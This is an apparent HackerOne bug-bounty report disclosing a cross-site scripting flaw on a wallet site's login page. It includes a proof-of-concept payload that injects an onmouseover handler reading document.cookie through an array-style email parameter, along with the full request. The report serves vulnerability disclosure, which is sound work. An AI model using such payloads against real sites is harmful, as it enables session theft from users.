# HackerOne Report: Cross site scripting
**Report ID:** 63888
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
page : 
https://wallet.romit.io/login

post data "email=xxx@xxx.com" set to "email[]=<a onmouseover=alert(document.cookie)>xxs link</a>"

full request data 
email[]=<a onmouseover=alert(document.cookie)>xxs link</a>&password=g00dPa%24%24w0rD&_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5

## Discussion & Remediation Timeline
